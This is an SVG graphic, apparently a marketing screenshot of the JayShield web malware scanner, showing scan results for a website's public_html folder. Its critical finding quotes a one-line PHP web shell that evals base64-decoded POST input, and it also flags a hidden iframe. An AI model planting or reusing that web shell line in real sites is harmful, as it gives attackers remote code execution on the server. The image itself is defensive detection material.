<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="744" viewBox="0 0 1080 744" font-family="ui-monospace, 'SF Mono', 'JetBrains Mono', Menlo, monospace">
  <defs>
    <linearGradient id="termFill" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#0e1712"/><stop offset="100%" stop-color="#0a100c"/></linearGradient>
    <filter id="shadow" x="-12%" y="-10%" width="124%" height="122%"><feDropShadow dx="0" dy="18" stdDeviation="26" flood-color="#000000" flood-opacity="0.45"/></filter>
    <filter id="glowLogo" x="-60%" y="-60%" width="220%" height="220%"><feGaussianBlur stdDeviation="3.4" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
  </defs>

  <g filter="url(#shadow)"><rect x="40" y="36" width="1000" height="656" rx="18" fill="url(#termFill)" stroke="#46f08a" stroke-opacity="0.28" stroke-width="1.4"/></g>
  <line x1="40" y1="86" x2="1040" y2="86" stroke="#46f08a" stroke-opacity="0.12" stroke-width="1"/>
  <circle cx="74" cy="62" r="6.5" fill="#ff5f56"/><circle cx="97" cy="62" r="6.5" fill="#ffbd2e"/><circle cx="120" cy="62" r="6.5" fill="#27c93f"/>
  <text x="150" y="67" font-size="16" fill="#5f7167">jayshield  —  ~/public_html</text>

  <!-- brand header: real JayHackPro logo + wordmark -->
  <rect x="84" y="118" width="58" height="58" rx="15" fill="#0b120e" stroke="#46f08a" stroke-opacity="0.5" stroke-width="2.2"/>
  <svg x="93" y="127" width="40" height="40" viewBox="64 69 172 172" preserveAspectRatio="xMidYMid meet" filter="url(#glowLogo)">
    <g fill="#46f08a">
      <path d="M164.99 123.84a3.72 3.72 0 1 1 0-7.44 3.72 3.72 0 1 1 0 7.44m14.9-7.45a3.72 3.72 0 1 0 0 7.44 3.72 3.72 0 1 0 0-7.44m-.01 6.75c-1.67 0-3.02-1.36-3.02-3.02s1.36-3.02 3.02-3.02 3.02 1.36 3.02 3.02-1.35 3.02-3.02 3.02m18.62 27.61v-2.5c0-.03-.01-.05-.01-.08zm7.45 5.44h.01v15.06h-.01z"/>
      <path d="M109.14 80.25v50.7c0 2.76 2.24 5 5 5h39.71c1.2.96 2.48 1.85 3.81 2.65-4.8.24-11.4 5.06-11.29 9.76.03 1.34 1.17 2.39 2.5 2.39h29.73c2.76 0 5 2.24 5 5v15.5c0 18.51-15 33.51-33.51 33.51-17 0-31.05-12.66-33.22-29.07-.33-2.52-2.42-4.44-4.97-4.44H91.61c-2.92 0-5.24 2.49-4.99 5.4 1.45 17.18 9.75 32.41 22.15 42.96 11.08 9.43 25.43 15.14 41.13 15.14s30.05-5.7 41.13-15.14c13.68-11.65 22.37-28.99 22.37-48.36v-91c0-2.76-2.24-5-5-5h-94.26c-2.76 0-5 2.24-5 5m71.55 55.7c-3.01 1.31-6.03 2.08-8.25 2.08-2.32 0-5.38-.77-8.4-2.08-3.99-1.73-7.91-4.42-10.01-7.56-1.64-2.45-2.17-5.18-.74-7.94 9.13-17.57 15.25-18.59 19.14-18.59s10.01 1.01 19.14 18.59c1.43 2.76.87 5.48-.8 7.94-2.13 3.15-6.1 5.83-10.08 7.56m25.27 35.3c0 20.59-11.17 38.62-27.76 48.36a55.7 55.7 0 0 1-28.3 7.7c-10.32 0-19.99-2.81-28.3-7.7-13.73-8.07-23.75-21.8-26.79-37.96-.29-1.54.9-2.96 2.47-2.96h2.92c1.18 0 2.21.82 2.44 1.98 4.19 21.15 22.26 38.43 46.36 38.95.37.01.74.03 1.11.03s.74-.02 1.11-.03c26.17-.59 47.28-22.05 47.28-48.36v-7.62h.01v-15.46c-.05-3.45-3.65-6.93-7.44-8.58-1.31-.57-2.63-.92-3.85-.99 1.35-.8 2.64-1.7 3.85-2.67 2.65-2.14 4.85-4.66 6.16-7.46 1.53-3.27 1.83-6.9.17-10.73-11.9-27.59-19.88-27.59-24.95-27.59s-13.05 0-24.95 27.59c-1.64 3.8-1.36 7.42.14 10.66H119.1a2.5 2.5 0 0 1-2.5-2.5V85.2a2.5 2.5 0 0 1 2.5-2.5h84.36a2.5 2.5 0 0 1 2.5 2.5v71h.01v15.05z"/>
      <path d="m181.22 121.49-.8-1.1a.8.8 0 0 0 .54-.39q.12-.21.12-.48t-.12-.48c-.12-.21-.19-.25-.34-.32-.15-.08-.31-.11-.51-.11h-1.18c-.17 0-.32.13-.32.29v2.55c0 .16.14.29.32.29s.31-.13.31-.29v-1h.55l.77 1.15c.06.09.16.14.27.14h.26c.14-.02.21-.16.13-.25m-.92-1.6c-.06.04-.13.05-.21.05h-.85v-.85h.85c.08 0 .15.02.21.05s.11.09.14.15.05.14.05.22c0 .09-.02.16-.05.23s-.08.11-.14.15m-56.27-26.28v2.18c0 1.08.69 2.03 1.71 2.37l9.46 3.15-9.46 3.15c-1.02.34-1.71 1.3-1.71 2.37v2.18c0 1.71 1.67 2.91 3.29 2.37l17.34-5.78c1.02-.34 1.71-1.3 1.71-2.37v-3.84c0-1.08-.69-2.03-1.71-2.37l-17.34-5.78c-1.61-.54-3.29.67-3.29 2.37"/>
    </g>
  </svg>
  <text x="162" y="145" font-size="33" font-weight="800" letter-spacing="-0.5" fill="#8effb6">JayHackPro<tspan font-size="16" dy="-13" fill="#46f08a">®</tspan></text>
  <text x="163" y="171" font-size="14.5" letter-spacing="0.2" fill="#66786c">Cybersecurity software  ·  Los Angeles, CA</text>

  <line x1="84" y1="202" x2="996" y2="202" stroke="#46f08a" stroke-opacity="0.12" stroke-width="1"/>

  <g font-size="18" xml:space="preserve">
    <text x="84" y="242"><tspan fill="#46f08a" font-weight="700">JayShield®  ·  find and remove web malware</tspan><tspan fill="#66786c">   v1.2.1</tspan></text>
    <text x="84" y="270" fill="#66786c">github.com/JayHackPro/JayShield</text>
    <text x="84" y="320" fill="#66786c">Scanned 1,284 files (24.6 MB) in 0.9s</text>
    <text x="84" y="372"><tspan fill="#ff5c5c" font-weight="700">CRITICAL</tspan><tspan fill="#e7eee8" font-weight="700"> public_html/wp-content/uploads/logo.php</tspan></text>
    <text x="84" y="400"><tspan fill="#ff5c5c">   ✕</tspan><tspan fill="#9db0a2"> Obfuscated eval of a decoded payload</tspan><tspan fill="#66786c">:1</tspan></text>
    <text x="84" y="428" fill="#5f7167">     &lt;?php @eval(base64_decode($_POST[&quot;cmd&quot;]));</text>
    <text x="84" y="480"><tspan fill="#ff9d3c" font-weight="700">HIGH    </tspan><tspan fill="#e7eee8" font-weight="700"> public_html/index.html</tspan></text>
    <text x="84" y="508"><tspan fill="#ff9d3c">   ▲</tspan><tspan fill="#9db0a2"> Hidden or zero-size iframe</tspan><tspan fill="#66786c">:42</tspan></text>
    <text x="84" y="560" fill="#8effb6" font-weight="700">Summary</text>
    <text x="84" y="588"><tspan fill="#ff5c5c">critical 1</tspan><tspan fill="#66786c">   </tspan><tspan fill="#ff9d3c">high 1</tspan><tspan fill="#66786c">   medium 0   low 0</tspan></text>
    <text x="84" y="616" fill="#66786c">2 files infected, 1,282 clean</text>
    <text x="84" y="648"><tspan fill="#46f08a" font-weight="700">✔ Review the findings, then remove them safely with </tspan><tspan fill="#8effb6" font-weight="700">--quarantine</tspan></text>
  </g>
</svg>
